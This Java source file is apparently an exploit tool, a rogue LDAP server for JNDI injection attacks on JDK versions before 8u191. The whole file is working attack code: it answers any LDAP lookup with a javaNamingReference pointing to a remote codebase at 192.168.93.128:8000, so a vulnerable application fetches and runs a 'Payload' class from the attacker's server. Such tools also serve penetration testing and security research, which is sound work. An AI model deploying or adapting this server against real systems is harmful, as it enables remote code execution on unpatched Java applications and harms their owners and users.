package nth347.servers.ldap;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;

/**
 * LDAP server for exploiting JNDI injection using remote class loading
 * The exploitation technique requires the target application to run on JDK 8u<191
 * Tested with target application running on JDK 8u66
 */
public class EvilLDAPServer {
    /**
     * LDAP server configuration
     */
    private static String LDAP_ADDRESS = "0.0.0.0";
    private static int LDAP_PORT = 6360;
    private static String LDAP_BASE = "dc=example,dc=com";

    /**
     * Payload configuration
     */
    private static String CODEBASE_URL = "http://192.168.93.128:8000/";
    private static String JAVA_CLASS_NAME = "Payload";
    private static String JAVA_FACTORY = "PayloadFactory";

    public static void main(String[] args) {
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName(LDAP_ADDRESS),
                    LDAP_PORT,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault())
            );

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(CODEBASE_URL)));
            InMemoryDirectoryServer directoryServer = new InMemoryDirectoryServer(config);
            System.out.println("LDAP server has started at " + LDAP_ADDRESS + ":" + LDAP_PORT);
            directoryServer.startListening();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        private URL codebase;

        public OperationInterceptor(URL cb) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch (Exception e1) {
                e1.printStackTrace();
            }
        }

        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry entry) throws LDAPException, MalformedURLException {
            URL url = new URL(this.codebase.toString());
            System.out.println("Send LDAP Reference that matches to name " + base + " for redirecting to " + url);
            System.out.println("Don't forget to deploy remote codebase on HTTP server");

            entry.addAttribute("javaClassName", JAVA_CLASS_NAME);
            entry.addAttribute("javaCodeBase", this.codebase.toString());
            entry.addAttribute("objectClass", "javaNamingReference");
            entry.addAttribute("javaFactory", JAVA_FACTORY);

            result.sendSearchEntry(entry);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
